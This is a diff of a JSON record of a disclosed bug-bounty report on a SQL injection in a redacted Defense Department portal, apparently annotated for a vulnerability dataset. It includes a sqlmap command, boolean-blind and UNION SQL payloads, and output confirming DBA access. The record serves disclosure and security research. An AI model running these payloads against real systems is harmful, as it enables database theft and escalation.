@@ -1,42 +1,46 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "rootaccess ",
-    "title": "SQL Injection vulnerability located at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
-    "content": "\nSummary:\nI have found a SQL Injection at \u2588\u2588\u2588\u2588\u2588\u2588\u2588 in the \u2588\u2588\u2588\u2588 Portal.\nDescription:\nThe SQL injection is being caused by the unsanitized parameter of _itemID= i immediately stopped testing when i verified it was possible to get the Current user and version of the Database.\n1.The vulnerable url is :\nhttps://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826*\n2. use sqlmap (https://github.com/sqlmapproject/sqlmap) with the following command\nCode 172 Bytes\n1python sqlmap.py -u \"https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826*\" --random-agent --current-user --is-dba\nsqlmap output :\nCode 1.07 KiB\n1---\n2Parameter: #1* (URI)\n3    Type: boolean-based blind\n4    Title: AND boolean-based blind - WHERE or HAVING clause\n5    Payload: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588:443/\u2588\u2588\u2588\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826 AND 2833=2833\n6\n7    Type: UNION query\n8    Title: Generic UNION query (NULL) - 2 columns\n9    Payload: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:443/\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiUngdWPubxHGXaEEDvfcozGjVAMxIqpHmWfTVJ'),'qbbxq') FROM VERSIONS-- AQYh\n10---\n11[22:37:56] [INFO] testing SAP MaxDB\n12[22:37:57] [WARNING] the back-end DBMS is not SAP MaxDB\n13[22:37:57] [INFO] testing MySQL\n14[22:37:58] [WARNING] the back-end DBMS is not MySQL\n15[22:37:58] [INFO] testing Oracle\n16[22:37:59] [INFO] confirming Oracle\n17[22:38:01] [INFO] the back-end DBMS is Oracle\n18web application technology: Apache, Servlet 2.5, JSP, JSP 2.1\n19back-end DBMS: Oracle\n20[22:38:01] [INFO] fetching current user\n21current user:    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n22[22:38:02] [INFO] testing if current user is DBA\n23current user is DBA:    True\nScreenshot\n{F322498}\nSuggested Mitigation/Remediation Actions\nSanitize the parameter of _itemID= through the use of prepared statements, or other forms of sanitizing.\nImpact\nIt could be possible for an attacker to Retrieve data, and depending of the data being stored in the database(passwords) it could be possible to further pivot, and get RCE since the current user in the database has DBA rights.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "rootaccess ",
+  "title": "SQL Injection vulnerability located at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary:\nI have found a SQL Injection at \u2588\u2588\u2588\u2588\u2588\u2588\u2588 in the \u2588\u2588\u2588\u2588 Portal.\nDescription:\nThe SQL injection is being caused by the unsanitized parameter of _itemID= i immediately stopped testing when i verified it was possible to get the Current user and version of the Database.\n1.The vulnerable url is :\nhttps://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826*\n2. use sqlmap (https://github.com/sqlmapproject/sqlmap) with the following command\nCode 172 Bytes\n1python sqlmap.py -u \"https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826*\" --random-agent --current-user --is-dba\nsqlmap output :\nCode 1.07 KiB\n1---\n2Parameter: #1* (URI)\n3    Type: boolean-based blind\n4    Title: AND boolean-based blind - WHERE or HAVING clause\n5    Payload: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588:443/\u2588\u2588\u2588\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826 AND 2833=2833\n6\n7    Type: UNION query\n8    Title: Generic UNION query (NULL) - 2 columns\n9    Payload: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:443/\u2588\u2588\u2588\u2588Portal/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588?_\u2588\u2588\u2588=true&_st=&_pageLabel=\u2588\u2588\u2588_\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiUngdWPubxHGXaEEDvfcozGjVAMxIqpHmWfTVJ'),'qbbxq') FROM VERSIONS-- AQYh\n10---\n11[22:37:56] [INFO] testing SAP MaxDB\n12[22:37:57] [WARNING] the back-end DBMS is not SAP MaxDB\n13[22:37:57] [INFO] testing MySQL\n14[22:37:58] [WARNING] the back-end DBMS is not MySQL\n15[22:37:58] [INFO] testing Oracle\n16[22:37:59] [INFO] confirming Oracle\n17[22:38:01] [INFO] the back-end DBMS is Oracle\n18web application technology: Apache, Servlet 2.5, JSP, JSP 2.1\n19back-end DBMS: Oracle\n20[22:38:01] [INFO] fetching current user\n21current user:    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n22[22:38:02] [INFO] testing if current user is DBA\n23current user is DBA:    True\nScreenshot\n{F322498}\nSuggested Mitigation/Remediation Actions\nSanitize the parameter of _itemID= through the use of prepared statements, or other forms of sanitizing.\nImpact\nIt could be possible for an attacker to Retrieve data, and depending of the data being stored in the database(passwords) it could be possible to further pivot, and get RCE since the current user in the database has DBA rights.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1565903280,
+  "report_url": "https://hackerone.com/reports/384397",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the vulnerable URL containing the unsanitized parameter CCD_itemID"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1565903280,
-    "report_url": "https://hackerone.com/reports/384397",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Identify the vulnerable URL containing the unsanitized parameter CCD_itemID"
-        ],
-        [
-            2,
-            "Use sqlmap with the provided command to exploit the SQL injection and verify database access"
-        ]
-    ],
-    "vuln_description": "The vulnerability is a SQL injection in the CCD_itemID parameter of a web application, allowing attackers to execute arbitrary SQL queries. The current user has DBA privileges, potentially enabling data retrieval and remote code execution.",
-    "reason": "The attack involves a straightforward SQL injection with no complex interactions or state manipulations required. The vulnerability was discovered using standard tools (sqlmap) and techniques.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL Injection vulnerability involves unsanitized input parameters and database queries, which is a different class of vulnerability from the AuthN/AuthZ and IDOR vulnerabilities described in the methodologies. The methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, whereas SQL Injection involves manipulating input to execute arbitrary SQL commands. Therefore, the described methodologies would not detect this SQL Injection vulnerability.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Use sqlmap with the provided command to exploit the SQL injection and verify database access"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a SQL injection in the CCD_itemID parameter of a web application, allowing attackers to execute arbitrary SQL queries. The current user has DBA privileges, potentially enabling data retrieval and remote code execution.",
+  "reason": "The attack involves a straightforward SQL injection with no complex interactions or state manipulations required. The vulnerability was discovered using standard tools (sqlmap) and techniques.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL Injection vulnerability involves unsanitized input parameters and does not directly relate to authentication or authorization boundaries being crossed by swapping user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, which are different from injection flaws.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL injection vulnerability was identified via an unsanitized parameter (CCD_itemID) in the URI. The proposed methodology involves detecting injectable parameters during regular navigation and testing them with simple payloads. Since the vulnerability was confirmed using generic UNION query payloads (common in basic SQLi testing) and the response was observable in the same HTTP channel (via boolean-based blind and UNION-based techniques), it aligns with the methodology. The payloads used by sqlmap for confirmation (e.g., UNION ALL SELECT NULL,CONCAT(...)) are standard and do not require custom filter bypasses. The parameter would have been flagged during step 3 of the methodology, and step 4 would have triggered the detectable behavior.",
+    "is_simple_injection": true
+  }
 }
